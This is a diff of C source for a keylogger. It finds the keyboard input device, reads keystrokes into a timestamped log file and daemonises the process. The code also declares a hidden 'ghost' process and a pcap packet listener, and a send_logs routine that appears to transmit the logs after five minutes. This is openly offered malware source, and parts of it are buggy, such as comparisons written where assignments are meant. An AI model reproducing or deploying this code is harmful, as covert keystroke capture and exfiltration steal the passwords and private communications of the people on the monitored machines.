@@ -18,7 +18,6 @@
 
 #include "key_util.h"
 #include "util.h"
-#include "config.h"
 #include "server_client.h"
 
 #include "ip.h"
@@ -39,7 +38,7 @@
 pid_t exec_ghost();
 void* keep_ghost_alive(void *args);
 void packet_received(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
-void* start_keylogging(int kb_fd, FILE *log_file);
+void* start_keylogging(void *args);
 void* send_logs();
 
 int main(int argc, char **argv)
@@ -115,7 +114,6 @@ int main(int argc, char **argv)
         exit(-1);
     }
     
-    Config config;
     /*Retrieve keyboard device file*/
     static const char *command =
     "grep -E 'Handlers|EV' /proc/bus/input/devices |"
@@ -132,14 +130,16 @@ int main(int argc, char **argv)
     char temp[9];
     fgets(temp, 9, pipe);
     pclose(pipe);
-    config.device_file = strcat(result, temp);
+    char *device_file;
+    device_file = strcat(result, temp);
     
     /*Open keyboard device file*/
-    int kb_fd = open(config.device_file, O_RDONLY);
+    int kb_fd = open(device_file, O_RDONLY);
     if (kb_fd == -1) {
         printf("Could not open keyboard device file. \nError: %s.  \nExiting...", strerror(errno));
         exit(-1);
     }
+
     
     /*Open log file*/
     FILE *log_file = fopen("log/keylog.txt", "a");
@@ -153,7 +153,7 @@ int main(int argc, char **argv)
     
     pcap_loop(handle, -1, packet_received, (u_char*) &info);
     
-    config_cleanup(&config);
+
     close(kb_fd);
     pcap_freecode(&filter);
     pcap_close(handle);
@@ -222,13 +222,16 @@ void packet_received(u_char *args, const struct pcap_pkthdr *header, const u_cha
         }
 }
 
-void* start_keylogging(int kb_fd, FILE *log_file){
-    
+void* start_keylogging(void *args)
+{
     typedef struct input_event input_event;
     input_event event;
     int shift_pressed=0; //If shift engaged, shift_pressed = 1
+    FILE *log_file = args;
+    int kb_fd = *((int *) args);
     
-    struct loginfo *info;
+    /*Use struct for timestamped_write*/
+    struct loginfo *info = (struct loginfo*) args;
     info->file = log_file;
     
     /*Daemonize process by redirecting stdin and stdout to /dev/null*/
@@ -237,28 +240,31 @@ void* start_keylogging(int kb_fd, FILE *log_file){
         exit(-1);
     }
     
-    while (1)
-    read(kb_fd, &event, sizeof(input_event) > 0);
-    if (event.type == EV_KEY) {
-        if (event.value == KEY_PRESS) {
-            if (is_shift(event.code)) {
-                shift_pressed == 1;
-            }
-            char *name = get_key_text(event.code, shift_pressed);
-            if (strcmp(name, "\0") != 0) {
-                timestamped_write(info, name);
-            }
-        } else if (event.value == KEY_RELEASE) {
-            if (is_shift(event.code)) {
-                shift_pressed == 0;
+    while (read(kb_fd, &event, sizeof(input_event)) > 0){
+        if (event.type == EV_KEY) {
+            if (event.value == KEY_PRESS) {
+                if (is_shift(event.code)) {
+                    shift_pressed == 1;
+                }
+                char *name = get_key_text(event.code, shift_pressed);
+                if (strcmp(name, "\0") != 0) {
+                    timestamped_write(info, name);
+                    timestamped_write(info, "\n");
+                }
+            } else if (event.value == KEY_RELEASE) {
+                if (is_shift(event.code)) {
+                    shift_pressed == 0;
+                }
             }
         }
     }
+    return EXIT_SUCCESS;
 }
 
-void *send_logs()
+void* send_logs()
 {
     sleep(300); //sleep for 300sec = 5 min
     run_client();
     run_server();
+    return EXIT_SUCCESS;
 }
